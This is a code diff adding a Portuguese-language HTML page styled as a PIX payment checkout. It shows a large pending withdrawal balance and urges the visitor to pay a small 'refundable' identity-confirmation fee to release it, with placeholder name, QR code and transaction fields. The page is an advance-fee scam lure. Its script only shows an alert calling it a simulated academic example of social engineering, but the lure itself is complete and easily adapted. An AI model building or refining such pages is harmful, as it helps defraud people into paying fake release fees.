@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout Pagamento - Confirmação PIX</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f8f8f8;
+            color: #333;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: #000;
+            color: white;
+            padding: 24px;
+            text-align: center;
+        }
+        .header h2 {
+            font-size: 14px;
+            color: #ccc;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .saldo {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .status {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+        .section {
+            padding: 24px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .section:last-child {
+            border-bottom: none;
+        }
+        .taxa-titulo {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+        .taxa-valor {
+            font-size: 28px;
+            font-weight: 700;
+            color: #e74c3c;
+            margin-right: 12px;
+        }
+        .tag-reembolso {
+            background: #d4edda;
+            color: #155724;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            vertical-align: middle;
+        }
+        .descricao {
+            margin-top: 16px;
+            color: #666;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        .dados-titulo {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+        .dado-linha {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+        .dado-linha:last-child {
+            border-bottom: none;
+        }
+        .dado-label {
+            color: #999;
+            font-size: 14px;
+        }
+        .dado-valor {
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .transacao {
+            background: #f8f9fa;
+            padding: 16px;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .transacao-titulo {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .transacao-codigo {
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #333;
+            letter-spacing: 1px;
+            word-break: break-all;
+        }
+        .btn-pagar {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            margin: 24px;
+            transition: transform 0.2s;
+        }
+        .btn-pagar:hover {
+            transform: translateY(-2px);
+        }
+        .qr-placeholder {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(45deg, #f0f0f0, #e0e0e0);
+            border-radius: 8px;
+            margin: 16px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header Saldo -->
+        <div class="header">
+            <h2>Saldo Disponível</h2>
+            <div class="saldo">R$ 4.834,72</div>
+            <div class="status">Aguardando confirmação para saque</div>
+        </div>
+
+        <!-- Taxa -->
+        <div class="section">
+            <div class="taxa-titulo">CONFIRMAÇÃO DE IDENTIDADE</div>
+            <div style="display: flex; align-items: center; margin-bottom: 16px;">
+                <div class="taxa-valor">R$ 34,67</div>
+                <span class="tag-reembolso">VALOR REEMBOLSÁVEL</span>
+            </div>
+            <div class="descricao">
+                Taxa obrigatória para liberação do saque no valor de <strong>R$ 4.834,72</strong>. 
+                O valor de <strong>R$ 34,67</strong> será reembolsado integralmente após a confirmação.
+            </div>
+        </div>
+
+        <!-- Dados -->
+        <div class="section">
+            <div class="dados-titulo">DADOS PARA REEMBOLSO</div>
+            <div class="dado-linha">
+                <span class="dado-label">Nome:</span>
+                <span class="dado-valor">[Personalizado]</span>
+            </div>
+            <div class="dado-linha">
+                <span class="dado-label">Data:</span>
+                <span class="dado-valor">13/03/2026</span>
+            </div>
+            <div class="dado-linha">
+                <span class="dado-label">Chave PIX:</span>
+                <span class="dado-valor">Chave Aleatória</span>
+            </div>
+            <div class="dado-linha">
+                <span class="dado-label">Valor a receber:</span>
+                <span class="dado-valor">R$ 4.834,72</span>
+            </div>
+        </div>
+
+        <!-- QR Code Placeholder & Transação -->
+        <div class="section">
+            <div class="qr-placeholder">QR CODE PIX</div>
+            <div class="transacao">
+                <div class="transacao-titulo">Código de Transação</div>
+                <div class="transacao-codigo">ca42b93f-8ea6-4480-8d17-e61c23cdadbb</div>
+            </div>
+        </div>
+
+        <button class="btn-pagar" onclick="processarPagamento()">
+            PAGAR TAXA DE LIBERAÇÃO
+        </button>
+    </div>
+
+    <script>
+        let nomePersonalizado = 'Usuário Teste';
+        
+        function processarPagamento() {
+            alert('Pagamento simulado! Este é um exemplo acadêmico de engenharia social.');
+            document.querySelector('.dado-valor').firstChild.textContent = nomePersonalizado || 'Usuário Teste';
+        }
+    </script>
+</body>
+</html>
